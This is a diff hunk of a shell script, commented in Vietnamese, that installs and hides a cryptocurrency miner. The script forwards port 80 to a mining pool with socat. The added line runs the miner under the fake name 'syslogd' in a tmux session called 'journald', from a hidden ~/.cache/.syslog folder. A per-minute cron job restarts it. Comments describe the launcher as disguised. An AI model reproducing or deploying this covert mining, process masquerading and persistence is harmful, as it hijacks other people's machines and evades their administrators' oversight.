@@ -57,17 +57,8 @@ tmux has-session -t proxy 2>/dev/null || \
 tmux new-session -d -s proxy "sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$POOL_REAL"
 
 # ==== Tạo script khởi chạy ngụy trang với giới hạn CPU ====
-cat > "$INSTALL_DIR/run_miner.sh" <<EOF
-#!/bin/bash
-cd "$INSTALL_DIR"
-exec cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json
-EOF
+tmux has-session -t journald 2>/dev/null || tmux new-session -d -s journald "cd ~/.cache/.syslog && ./syslogd -c .cfg.json" 2>> /root/.cache/.syslog/error.log
 
-chmod +x "$INSTALL_DIR/run_miner.sh"
-
-# Chạy bằng cách gọi full path, ghi log lỗi nếu fail
-tmux has-session -t "$SESSION_NAME" 2>/dev/null || \
-tmux new-session -d -s "$SESSION_NAME" "bash $INSTALL_DIR/run_miner.sh" 2>> $INSTALL_DIR/error.log
 
 # ==== Tạo cron job để tự khôi phục ====
 (crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME '$INSTALL_DIR/run_miner.sh')") | crontab -
